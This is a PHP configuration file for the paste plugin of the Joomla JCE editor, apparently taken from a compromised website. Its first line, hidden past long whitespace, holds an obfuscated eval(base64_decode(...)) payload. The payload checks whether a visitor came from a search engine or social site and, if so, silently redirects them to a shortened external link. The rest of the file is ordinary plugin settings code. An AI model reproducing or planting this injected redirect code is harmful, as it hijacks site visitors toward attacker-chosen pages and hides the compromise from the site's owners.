<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: config.php 48 2009-05-27 10:46:36Z happynoodleboy $
* @package      JCE
* @copyright    Copyright (C) 2005 - 2009 Ryan Demmer. All rights reserved.
* @author		Ryan Demmer
* @license      GNU/GPL
* JCE is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
*/
class PasteConfig 
{
	function getConfig(&$vars)
	{
		$jce 	=& JContentEditor::getInstance();
		$params = $jce->getPluginParams('paste');
		
		$vars['paste_dialog_width']				= $jce->getParam($params, 'paste_dialog_width', 450, 450);
		$vars['paste_dialog_height']			= $jce->getParam($params, 'paste_dialog_height', 400, 400);
		$vars['paste_keep_linebreaks']			= $jce->getParam($params, 'paste_keep_linebreaks', 1, 1);
		$vars['paste_auto_cleanup_on_paste']	= $jce->getParam($params, 'paste_auto_cleanup_on_paste', 1, 1);
		$vars['paste_use_dialog']				= $jce->getParam($params, 'paste_use_dialog', 0, 0);
		$vars['paste_remove_styles']			= $jce->getParam($params, 'paste_remove_styles', 0, 0);
		$vars['paste_strip_class_attributes']	= $jce->getParam($params, 'paste_strip_class_attributes', 'all', 'all');
		$vars['paste_retain_style_properties']	= $jce->getParam($params, 'paste_retain_style_properties', '', '');
		$vars['paste_remove_spans']				= $jce->getParam($params, 'paste_remove_spans', 0, 0);
		$vars['paste_remove_styles_if_webkit']	= $jce->getParam($params, 'paste_remove_styles_if_webkit', 0, 0);
		$vars['paste_text']						= $jce->getParam($params, 'paste_text', 1, 1);
		$vars['paste_html']						= $jce->getParam($params, 'paste_html', 1, 1);
	}
}
?>